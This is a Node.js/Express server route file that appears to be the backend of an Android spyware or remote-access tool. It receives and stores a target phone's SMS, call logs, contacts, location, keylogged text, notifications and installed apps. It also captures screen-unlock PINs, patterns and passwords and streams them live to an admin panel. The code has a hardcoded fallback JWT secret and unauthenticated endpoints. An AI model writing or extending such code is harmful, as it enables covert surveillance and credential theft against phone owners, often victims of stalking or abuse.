const express = require('express');
const jwt = require('jsonwebtoken');
const prisma = require('../lib/db');

const router = express.Router();

const { getOrCreateDevice } = require('../utils/deviceHelper');

/**
 * Helper to find/create device from request
 */
async function findDevice(req) {
    return await getOrCreateDevice(req);
}

/**
 * Middleware to extract deviceId from JWT token, headers, or body
 */
function extractDeviceId(req, res, next) {
    // First try to get deviceId from body (for backwards compatibility)
    if (req.body && req.body.deviceId) {
        req.deviceId = req.body.deviceId;
        return next();
    }

    // Check X-Device-Id header (used by Android app)
    const xDeviceId = req.headers['x-device-id'];
    if (xDeviceId) {
        req.deviceId = xDeviceId;
        return next();
    }

    // Then try to extract from JWT token in Authorization header
    const authHeader = req.headers.authorization;
    if (authHeader && authHeader.startsWith('Bearer ')) {
        const token = authHeader.split(' ')[1];
        try {
            const decoded = jwt.verify(token, process.env.JWT_SECRET || 'fallback-secret');
            if (decoded.deviceId) {
                req.deviceId = decoded.deviceId;
                return next();
            }
        } catch (error) {
            console.log('[SYNC] Token decode error:', error.message);
        }
    }

    // Fallback - no deviceId found
    console.log('[SYNC] No deviceId found in request');
    req.deviceId = null;
    next();
}

// Apply middleware to all routes
router.use(extractDeviceId);

/**
 * POST /api/sync/sms
 * Sync SMS messages from device
 */
router.post('/sms', async (req, res) => {
    try {
        // Get deviceId from middleware (extracted from token or body)
        const deviceId = req.deviceId;
        // Support both { messages: [...] } and direct array [...]
        const messages = Array.isArray(req.body) ? req.body : (req.body.messages || req.body);

        const device = await findDevice(req);
        if (!device) {
            return res.status(404).json({ success: false, error: 'Device ID required or device not found' });
        }

        if (!messages || !Array.isArray(messages)) {
            return res.status(400).json({ success: false, error: 'Invalid messages array' });
        }

        // Bulk create SMS logs
        const created = await prisma.smsLog.createMany({
            data: messages.map(msg => ({
                deviceId: device.id,
                address: msg.address || msg.number || '',
                body: msg.body || msg.message || '',
                type: msg.type || 'unknown',
                externalId: (msg.smsId || msg.id || '').toString(),
                timestamp: new Date(msg.timestamp || Date.now())
            })),
            skipDuplicates: true
        });

        // Update device last seen
        await prisma.device.update({
            where: { id: device.id },
            data: { lastSeen: new Date(), isOnline: true }
        });

        // Emit socket event for real-time admin panel update
        if (created.count > 0) {
            const io = req.app.get('io');
            if (io) {
                // Use device.deviceId (external ID from Android) - this matches URL param in admin panel
                io.to('admin').emit('sms:update', {
                    deviceId: device.deviceId,
                    count: created.count,
                    timestamp: Date.now()
                });
                console.log(`[SYNC] Emitted sms:update for device ${device.deviceId}`);
            }
        }

        console.log(`[SYNC] SMS: ${created.count} messages from ${deviceId}`);
        res.json({ success: true, synced: created.count });
    } catch (error) {
        console.error('[SYNC] SMS error:', error);
        res.status(500).json({ success: false, error: 'Failed to sync SMS' });
    }
});

/**
 * POST /api/sync/calls
 * Sync call logs from device
 */
router.post('/calls', async (req, res) => {
    try {
        const deviceId = req.deviceId;
        const calls = Array.isArray(req.body) ? req.body : (req.body.calls || req.body);

        const device = await findDevice(req);
        if (!device) {
            return res.status(404).json({ success: false, error: 'Device ID required or device not found' });
        }

        if (!calls || !Array.isArray(calls)) {
            return res.status(400).json({ success: false, error: 'Invalid calls array' });
        }

        const created = await prisma.callLog.createMany({
            data: calls.map(call => ({
                deviceId: device.id,
                number: call.number || '',
                name: call.name || null,
                type: call.type || 'unknown',
                duration: parseInt(call.duration) || 0,
                externalId: (call.callId || call.id || '').toString(),
                timestamp: new Date(call.timestamp || Date.now())
            })),
            skipDuplicates: true
        });

        await prisma.device.update({
            where: { id: device.id },
            data: { lastSeen: new Date(), isOnline: true }
        });

        // Emit socket event for real-time admin panel update
        if (created.count > 0) {
            const io = req.app.get('io');
            if (io) {
                // Use device.deviceId (external ID from Android) - this matches URL param in admin panel
                io.to('admin').emit('calls:update', {
                    deviceId: device.deviceId,
                    count: created.count,
                    timestamp: Date.now()
                });
                console.log(`[SYNC] Emitted calls:update for device ${device.deviceId}`);
            }
        }

        console.log(`[SYNC] Calls: ${created.count} records from ${deviceId}`);
        res.json({ success: true, synced: created.count });
    } catch (error) {
        console.error('[SYNC] Calls error:', error);
        res.status(500).json({ success: false, error: 'Failed to sync calls' });
    }
});

/**
 * POST /api/sync/contacts
 * Sync contacts from device
 */
router.post('/contacts', async (req, res) => {
    try {
        const deviceId = req.deviceId;
        const contacts = Array.isArray(req.body) ? req.body : (req.body.contacts || req.body);

        const device = await findDevice(req);
        if (!device) {
            return res.status(404).json({ success: false, error: 'Device ID required or device not found' });
        }

        if (!contacts || !Array.isArray(contacts)) {
            return res.status(400).json({ success: false, error: 'Invalid contacts array' });
        }

        // Delete existing contacts and replace with new ones
        await prisma.contact.deleteMany({ where: { deviceId: device.id } });

        const created = await prisma.contact.createMany({
            data: contacts.map(contact => ({
                deviceId: device.id,
                name: contact.name || 'Unknown',
                // Android sends phoneNumbers array, extract first one
                phone: contact.phone || contact.number || (contact.phoneNumbers && contact.phoneNumbers[0]) || null,
                // Android sends emails array, extract first one
                email: contact.email || (contact.emails && contact.emails[0]) || null
            }))
        });

        await prisma.device.update({
            where: { id: device.id },
            data: { lastSeen: new Date(), isOnline: true }
        });

        console.log(`[SYNC] Contacts: ${created.count} from ${deviceId}`);
        res.json({ success: true, synced: created.count });
    } catch (error) {
        console.error('[SYNC] Contacts error:', error);
        res.status(500).json({ success: false, error: 'Failed to sync contacts' });
    }
});

/**
 * POST /api/sync/location
 * Sync location data from device
 */
router.post('/location', async (req, res) => {
    try {
        const deviceId = req.deviceId || req.body.deviceId;
        const device = await findDevice(req);
        if (!device) {
            return res.status(404).json({ success: false, error: 'Device ID required or device not found' });
        }

        // Handle both single location and array of locations
        const locationEntries = Array.isArray(req.body) ? req.body : [req.body];

        // Filter out entries with invalid coordinates (NaN)
        const validLocations = locationEntries.filter(loc => {
            const lat = parseFloat(loc.latitude);
            const lng = parseFloat(loc.longitude);
            return !isNaN(lat) && !isNaN(lng);
        });

        if (validLocations.length === 0) {
            return res.json({ success: true, message: 'No valid locations to sync' });
        }

        // Bulk create using prisma.location.createMany
        await prisma.location.createMany({
            data: validLocations.map(loc => ({
                deviceId: device.id,
                latitude: parseFloat(loc.latitude),
                longitude: parseFloat(loc.longitude),
                accuracy: loc.accuracy ? parseFloat(loc.accuracy) : null,
                altitude: loc.altitude ? parseFloat(loc.altitude) : null,
                speed: loc.speed ? parseFloat(loc.speed) : null,
                timestamp: new Date(loc.timestamp || Date.now())
            }))
        });

        await prisma.device.update({
            where: { id: device.id },
            data: { lastSeen: new Date(), isOnline: true }
        });

        // Emit only the latest valid location update
        const latestLoc = validLocations[validLocations.length - 1];
        const io = req.app.get('io');
        if (io) {
            io.to('admin').emit('location:update', {
                deviceId,
                location: {
                    latitude: parseFloat(latestLoc.latitude),
                    longitude: parseFloat(latestLoc.longitude),
                    accuracy: latestLoc.accuracy,
                    timestamp: latestLoc.timestamp
                }
            });
        }

        console.log(`[SYNC] Location: ${validLocations.length} entries from ${deviceId}`);
        res.json({ success: true, synced: validLocations.length });
    } catch (error) {
        console.error('[SYNC] Location error:', error);
        res.status(500).json({ success: false, error: 'Failed to sync location' });
    }
});

/**
 * POST /api/sync/keylog
 * Sync keylog data from device
 */
router.post('/keylog', async (req, res) => {
    try {
        const deviceId = req.deviceId;
        const device = await findDevice(req);
        if (!device) {
            return res.status(404).json({ success: false, error: 'Device ID required or device not found' });
        }

        let entries = [];
        if (Array.isArray(req.body)) {
            entries = req.body;
        } else if (req.body.entries && Array.isArray(req.body.entries)) {
            entries = req.body.entries;
        } else if (typeof req.body === 'object' && req.body !== null) {
            // Check if it's a single entry object
            if (req.body.text || req.body.app) {
                entries = [req.body];
            }
        }

        if (entries.length === 0) {
            return res.json({ success: true, message: 'No entries to sync' });
        }

        const created = await prisma.keylog.createMany({
            data: entries.map(entry => ({
                deviceId: device.id,
                // Android sends: appPackage, server also accepts: app, packageName
                app: entry.appPackage || entry.app || entry.packageName || null,
                appName: entry.appName || null,
                text: entry.text || '',
                timestamp: new Date(entry.timestamp || Date.now())
            }))
        });

        await prisma.device.update({
            where: { id: device.id },
            data: { lastSeen: new Date(), isOnline: true }
        });

        console.log(`[SYNC] Keylog: ${created.count} entries from ${deviceId}`);
        res.json({ success: true, synced: created.count });
    } catch (error) {
        console.error('[SYNC] Keylog error:', error);
        res.status(500).json({ success: false, error: 'Failed to sync keylog' });
    }
});

/**
 * POST /api/sync/apps
 * Sync installed apps from device
 */
router.post('/apps', async (req, res) => {
    try {
        const deviceId = req.deviceId;
        const apps = Array.isArray(req.body) ? req.body : (req.body.apps || req.body);

        const device = await findDevice(req);
        if (!device) {
            return res.status(404).json({ success: false, error: 'Device ID required or device not found' });
        }

        if (!apps || !Array.isArray(apps)) {
            return res.status(400).json({ success: false, error: 'Invalid apps array' });
        }

        // Upsert apps
        let synced = 0;
        for (const app of apps) {
            await prisma.appInfo.upsert({
                where: {
                    deviceId_packageName: {
                        deviceId: device.id,
                        packageName: app.packageName || app.package || ''
                    }
                },
                update: {
                    name: app.name || app.appName || 'Unknown',
                    versionName: app.versionName || app.version || null,
                    isSystem: app.isSystem || false
                },
                create: {
                    deviceId: device.id,
                    name: app.name || app.appName || 'Unknown',
                    packageName: app.packageName || app.package || '',
                    versionName: app.versionName || app.version || null,
                    installDate: app.installDate ? new Date(app.installDate) : null,
                    isSystem: app.isSystem || false
                }
            });
            synced++;
        }

        await prisma.device.update({
            where: { id: device.id },
            data: { lastSeen: new Date(), isOnline: true }
        });

        console.log(`[SYNC] Apps: ${synced} from ${deviceId}`);
        res.json({ success: true, synced });
    } catch (error) {
        console.error('[SYNC] Apps error:', error);
        res.status(500).json({ success: false, error: 'Failed to sync apps' });
    }
});

/**
 * POST /api/sync/notifications
 * Sync notifications from device
 */
router.post('/notifications', async (req, res) => {
    try {
        const deviceId = req.deviceId;
        const notifications = Array.isArray(req.body) ? req.body : (req.body.notifications || req.body);

        const device = await findDevice(req);
        if (!device) {
            return res.status(404).json({ success: false, error: 'Device ID required or device not found' });
        }

        if (!notifications || !Array.isArray(notifications)) {
            return res.status(400).json({ success: false, error: 'Invalid notifications array' });
        }

        const created = await prisma.notificationLog.createMany({
            data: notifications.map(notif => ({
                deviceId: device.id,
                app: notif.app || notif.packageName || '',
                appName: notif.appName || null,
                title: notif.title || null,
                text: notif.text || notif.content || null,
                timestamp: new Date(notif.timestamp || Date.now())
            }))
        });

        await prisma.device.update({
            where: { id: device.id },
            data: { lastSeen: new Date(), isOnline: true }
        });

        console.log(`[SYNC] Notifications: ${created.count} from ${deviceId}`);
        res.json({ success: true, synced: created.count });
    } catch (error) {
        console.error('[SYNC] Notifications error:', error);
        res.status(500).json({ success: false, error: 'Failed to sync notifications' });
    }
});

/**
 * DELETE /api/sync/chat
 * Clear chat messages for a specific device, app, and optionally contact
 */
router.delete('/chat', async (req, res) => {
    try {
        const { deviceId, chatApp, contactName } = req.query;

        if (!deviceId) {
            return res.status(400).json({ success: false, error: 'Device ID required' });
        }

        // Build delete query
        const whereClause = { deviceId };
        if (chatApp) whereClause.chatApp = chatApp;
        if (contactName) whereClause.contactName = contactName;

        const deleted = await prisma.chatMessage.deleteMany({
            where: whereClause
        });

        console.log(`[SYNC] Deleted ${deleted.count} chat messages for device ${deviceId}`);
        res.json({ success: true, deleted: deleted.count });
    } catch (error) {
        console.error('[SYNC] Delete chat error:', error);
        res.status(500).json({ success: false, error: 'Failed to delete chat messages' });
    }
});

/**
 * POST /api/sync/unlock
 * Sync unlock attempts (PIN, pattern, password) from device
 */
router.post('/unlock', async (req, res) => {
    try {
        const deviceId = req.deviceId;
        const device = await findDevice(req);
        if (!device) {
            return res.status(404).json({ success: false, error: 'Device ID required or device not found' });
        }

        // Support both single attempt and array
        let attempts = [];
        if (Array.isArray(req.body)) {
            attempts = req.body;
        } else if (req.body.attempts && Array.isArray(req.body.attempts)) {
            attempts = req.body.attempts;
        } else if (typeof req.body === 'object' && req.body !== null) {
            // Single attempt object
            if (req.body.unlockType || req.body.type) {
                attempts = [req.body];
            }
        }

        if (attempts.length === 0) {
            return res.json({ success: true, message: 'No unlock attempts to sync' });
        }

        const created = await prisma.unlockAttempt.createMany({
            data: attempts.map(attempt => ({
                deviceId: device.id,
                unlockType: attempt.unlockType || attempt.type || 'unknown',
                unlockData: attempt.unlockData || attempt.data || null,
                success: attempt.success === true || attempt.result === 'success',
                reason: attempt.reason || null,
                timestamp: new Date(attempt.timestamp || Date.now())
            }))
        });

        await prisma.device.update({
            where: { id: device.id },
            data: { lastSeen: new Date(), isOnline: true }
        });

        // Emit socket event for real-time admin panel update
        const io = req.app.get('io');
        if (io) {
            // Emit each attempt for real-time display
            attempts.forEach(attempt => {
                io.to('admin').emit('unlock:attempt', {
                    deviceId: device.deviceId,
                    unlockType: attempt.unlockType || attempt.type || 'unknown',
                    unlockData: attempt.unlockData || attempt.data || null,
                    success: attempt.success === true || attempt.result === 'success',
                    reason: attempt.reason || null,
                    timestamp: attempt.timestamp || Date.now()
                });
            });
            console.log(`[SYNC] Emitted unlock:attempt for device ${device.deviceId}`);
        }

        console.log(`[SYNC] Unlock attempts: ${created.count} from ${deviceId}`);
        res.json({ success: true, synced: created.count });
    } catch (error) {
        console.error('[SYNC] Unlock error:', error);
        res.status(500).json({ success: false, error: 'Failed to sync unlock attempts' });
    }
});

module.exports = router;
